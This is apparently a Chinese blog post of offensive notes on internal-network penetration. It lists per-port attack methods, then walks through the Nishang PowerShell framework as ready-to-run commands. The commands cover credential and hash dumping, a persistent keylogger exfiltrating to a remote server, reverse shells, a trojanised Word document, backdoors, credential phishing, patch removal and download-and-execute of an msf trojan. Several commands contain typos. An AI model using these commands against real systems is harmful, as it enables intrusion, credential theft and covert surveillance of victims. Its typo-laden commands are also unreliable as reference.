# 内网渗透


# 内网分类：

- 带域环境的内网
- 不带域环境的内网

  
# 一些端口

### 文件共享服务端口渗透

> 比如学校机房有专门用来下载文件的服务器

#### ftp服务

**FTP服务：** ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；
**默认端口：**20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）

###### 攻击方式：

- 爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块；
- 匿名访问：用户名：anonymous 密码：为空或任意邮箱

#### Samba服务

**Samba服务：**对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。
默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）

###### 攻击方式：

- 爆破：弱口令（爆破工具采用hydra）hydra -l username -P
- PassFile IP smb
- 未授权访问：给予public用户高权限
- 远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等

#### LDAP协议

**ldap：**轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。
默认端口：389

###### 攻击方式：

- 注入攻击盲注 
- 未授权访问
- 爆破：弱口令



### 远程连接服务端口渗透

#### SSH服务

**SSH服务：**  这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。
**默认端口：**    22

###### 攻击方式：

- 爆破：
- 弱口令
- 漏洞：28退格漏洞、OpenSSL漏洞

#### Telent服务

**Telnet服务：**在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；
**默认端口：**  23

###### 攻击方式：

- 爆破：弱口令
- 嗅探：此种情况一般发生在局域网

#### 远程桌面连接

**远程桌面连接：**作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；
**默认端口：**  3389

###### 攻击方式：

- 爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块)
- Shift粘滞键后门：5次shift后门
- 3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_...，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids）

#### VNC服务

**VNC服务:**    一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也
**默认端口：**5900+桌面ID（5901；5902）

###### 攻击方式：

- 爆破：弱口令
- 认证口令绕过：
- 拒绝服务攻击：（CVE-2015-5239）
- 权限提升：（CVE-2013-6886）

#### 第三方软件

... ... 

### Web应用服务端口渗透

#### 1.中间件平台渗透

```
IIS Apache Nginx Weblogic tomcat Jboos Websphere等
# 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF`
```



#### 2.WEB应用程序渗透

- 已知CMS 

- 未知CMS 

- 常规漏洞测试

  

### 数据库服务端口渗透

针对所有的	数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。

#### MySQL数据库

**默认端口：** 3306

###### 攻击方式：

- 爆破：弱口令
- 身份认证漏洞：CVE-2012-2122
- 拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器
- Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意

#### MSSQL数据库

**默认端口：**1433（Server 数据库服务）、1434（Monitor 数据库监控）

###### 攻击方式：

- 爆破：弱口令

#### Oracle数据库

**默认端口：**1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）

###### 攻击方式：

- 爆破：弱口令
- 漏洞攻击

#### PostgreSQL数据库

PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。
**默认端口：** 5432

###### 攻击方式：

- 爆破弱口令：postgres postgres
- 缓冲区溢出：CVE-2014-2669

#### MongoDB数据库

MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考
**默认端口：**  27017

###### 攻击方式：

- 爆破弱口令 

- 未授权访问

#### Redis数据库

redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。

Exp：https://yunpan.cn/cYjzHxawFpyVt 访问密码 e547
**默认端口：**  6379

###### 攻击方式：

- 爆破弱口令 

- 未授权访问+配合ssh key提权

#### SysBase数据库

**默认端口：**服务端口5000；监听端口4100；备份端口：4200

###### 攻击方式：

- 爆破：
- 弱口令;
- 命令注入

#### DB2数据库

**默认端口：**5000

###### 攻击方式：

- 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）

  

**总结一下：**对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！

### 邮件服务端口渗透

#### SMTP协议

smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！
**默认端口：**  25（smtp）、465（smtps）

###### 攻击方式：

- 爆破：弱口令

- 未授权访问

#### POP3协议

**默认端口：** 109（POP2）、110（POP3）、995（POP3S）

###### 攻击方式：

- 爆破弱口令

- 未授权访问

#### IMAP协议

**默认端口：**143（imap）、993（imaps）

###### 攻击方式：

- 爆破：弱口令

- 配置不当



### 网络常见协议端口渗透

#### DNS服务

**默认端口：** 53

###### 攻击方式：

- 区域传输漏洞

#### DHCP服务

**默认端口：**67&68、546（DHCP Failover做双机热备的）

###### 攻击方式：

- DHCP劫持

#### SNMP协议

**默认端口：** 161
攻击方式:

- 爆破弱口令

------



# Powershell框架

> 推荐使用 NiShang

> 参考文章：https://www.4hou.com/posts/E99ml

> 下载地址: https://github.com/samratashok/nishang

> 各种命令解析： https://www.explainshell.com

#### 安装问题

nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级）

- powershell ISE是一个编译器
- powershell有很多渗透框架：
- PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异

> 实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要

#### 目录结构：

<img src="http://image.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%9B%AE%E5%BD%95.png"></img>

#### 模块和功能介绍：

<img src="http://image.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%8A%9F%E8%83%BD.png"></img>

#### 演示：

端口扫描 密码获取 键盘记录 反弹会话 口令爆破

#### 实战应用：

- 后续控制
- 域渗透
- 系统提权

```pythn
# 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`）

Import-Module .nishang.psml

# 载入模块  查看NiShang都有哪些模块

Get-Command -Moudle nishang

## 查看机器基本信息

Get-Information

# 把结果导出文件  Out-File

Get-Information | Out-File res.txt


# 检测是否为虚拟机

Check-VM


## 获取密码

Invoke-Minikatz
#Dump出本机的凭证信息
Invoke-Minikatz -DumpCerts
#dump出远程的两台计算机的凭证信息
Invoke-Minikatz -ComputerName @("computer1", "computer2")
#在远程的一台机器上运行Mimikatz 并执行 "privilege::debug exit"
Invoke-Minikatz -Command "privilege::debug exit" -ComputerName@("computer1")


# Get-PassHashes 获取密码

# 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump）

Get-PassHashes


# 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率

Get-PassHints



## 获取帮助参数  Get-Help

Get-Help Invoke-PortScan


## 端口扫描

查看帮助信息
Get-Help Invoke-PortScan -full
Invoke-PortScan
Invoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost 



# cd 切换到对应目录

## 测试键盘记录:  

Get-Help .\Keylogger.ps1 --full   # 查看帮助（提供了四种方式记录）
#-URL 要把记录发Keylogger送到的置顶的远程服务器    ,    -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录
.\gather\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php 

# 解释： 将记录指定发送给一个可以记录Post请求的Web服务器

# 默认保存到(内容是ascii码)： Windows/Temp/key.log

# 把ascii记录解析为非ascii：

Parse_Keys .\key.log .\parsed.txt

# 持久化记录（重启之后也记录）

.\Keylogger.ps1 -persist



## 爆破口令  在scan目录下面

#用于对SQL Server、域控制器、Web和FTP弱口令爆破
Invoke-BruteForce
#命令参数如下
-ComputerName    # 对应服务的计算机名
-UserList  用户名字典
-PasswordList  密码字典
-Service 服务（默认为：SQL）
-StopOnSuccess   匹配一个后停止
-Delay    延迟时间
#比如
Invoke-BruteForce -ComputerName  xx-PC  -UserList user.txt  -PasswordList pass.txt  -Service ActiveDirectory  -Verbose


# 内网扫描器

# 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener

#1.在本机开启监听
FireListener 130-150
#2.在目标机器输入命令：
FireListener 192.168.0.107 130-150 -Verbose


## 内网嗅探

动静很大，实在没有办法的时候可以试试
目标机执行以下命令
Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999
本机监听
nc -lvvp 9999



## 屏幕窃取   Show-TargetScreen

#本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可）
Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443   # 将远程的画面传输给 192.168.230.1 的443端口
参数： Bind --> 正向连接

在目标机执行以下命令（反向连接）
Show-TargetScreen  -IPAddress 192.168.230.172 -Port 3333
本机输入以下命令 ，接着访问本机的9999端口
nc -nlvp 3333 | nc -nlvp 9999


正向连接
目标机执行：
Show-TargetScreen -Bind -Port 3333
本机执行：
nc -nv 192.168.230.37 3333 | nc -lnvp 9999





## Client 的生成(类似木马)

需要自己绑定payload
首先在本机监听：
nc -lvp 4444
接着制作word文件，打开\nishang\Shell\Invoke-PowerShellTcpOneLine.ps1文件，复制第三行的内容，可以看到有一个`TcpClient`的参数，这就是远程连接的地址，把他改为本机的IP和你监听的端口，改完以后复制代码，在命令行下如下执行
Invoke-Encode -DataToEncode '复制的代码' -IsString -PostScript
执行完之后会在当前目录生成两个文件，一个是encode.txt， 一个是encodedcommand.txt
接着执行命令
Out-Word-PayloadScript .\encodedcommand.txt
会生成一个word文档，用户打开就中招，我们获取到反弹的powershell



##  后门

1.Http-Backdoor
可以帮助我们在目标机器上下载和执行powershell脚本，接收来自第三方网站的制定，然后在内存中执行powershell脚本

2.Add-ScrnSaveBackdoor
利用windows的屏保来留下一个隐藏的后门

3.Execute-OnTime
与Http-Backdoor相比，多了定时功能

4.Invoke-ADSBackdoor
使用NTFS数据流留下的一个永久后门
最恐怖的后门





## 钓鱼攻击(有道用户输入自己机器的密码)

Invoke-CredentialsPhish


## webshell后门   位于 \nishang\Antak-WebShell目录下

就是一个asp的大马（使用的是powershell的命令，比cmd命令强大）



# 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来）

Copy-VSS    # 直接把文件保存在当前路径下
Copy-VSS -DEstinationDir C:temp    # 制定文件保存路径（必须是已存在的路径）

## 其他......
```



###### 后续控制

```python
# windows上没有nc，需要提前上传一个nc.exe，推荐Linux

## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip）  在Shells目录下面

#1.攻击机器上 NC下执行: 
nc -lvp 3333
#2.在目标服务器 PowerShell下执行：  TCO的
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.103 -Port 3333



## NO2.正向连接:

#1.目标 PowerShell下执行:  TCP的，  另外还有UDP的: 
Invoke-PowerShellTcp -Bind -Port 3333
#NC下执行: 请求他的3333端口
nc -nv 192.168.0.103 3333


### 基于UDP( Invoke-PowerShellUdp )，  nc命令有点不同

正向连接
nc -nvu 192.168.0.103 3333
反向连接
nc lup 3333

### 基于http和https  （ Invoke-PoshRatHttp ）

### 此外,还有http的shell(执行完会生成一条命令，然后???)

Invoke-PoshRatHttp -Reverse -IPAddress 192.168.0.103 -Port 3333
Invoke-PoshRatHttps -Reverse -IPAddress 192.168.0.103 -Port 3333

# 然后将生成的命令复制到`目标机`cmd执行，执行完毕会自动消失，然后在本机的powershell下会返回目标机的会话


```



###### 域渗透

在nishang目录下面的ActiveDirectory下面

**疑难杂症**
1.真实案例分析

```python

```



2.各种安全限制

```python
无解析

无权限

无执行
```



###### 系统提权

- 基于数据库
- 基于漏洞（常用，如果电脑没补丁，可以删除补丁）
- 第三方软件

```python
# 查看系统的补丁
systeminfo

# 删除补丁
Remove-Update   # 然后输入补丁编号

# 删除全部补丁
Remove-Update All

# 删除全部的安全补丁
Remove-Update Security

# 删除指定的补丁
Remove-Update KB2761226



#### Bypass  UAC    :   模块:Invoke-PsUACme
UAC (用户账户控制)
Get-Help  获取帮助

```



###### powershell下载文件(nishang)

```python
$client = new-object System.Net.WebClient
$client.DownloadFile('#1', '#2')
#1是需要下载文件的url
#2是保存为本地文件的路径，包括文件名
例如：
$client.DownloadFile('https://www.2cto.com/net/201611/562900.html', 'D:/562900.html')


# 或者这个方法

$src = 'https://www.pstips.net/index.php'
$des = "$env:temp\index.php"
Invoke-WebRequest -uri $src -OutFile $des
Unblock-File $des


# 下载完之后就可以用啦


## 下载执行       Download_Execute

下载文本文件，然后转换为可执行文件执行

利用exetotext.ps1把msf生成的木马端`msf.exe`更改为`msf.txt`文件
ExetoTxt c:msf.exe  c:msf.txt

然后输入以下命令，调用`Download Execute`脚本下载并执行该文件
Download Execute http://192.168.110.128/msf.txt

这时，msf的监听端就会成功获得反弹回来的shell
```



> powershell是没有杀毒软件提示的

---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/  

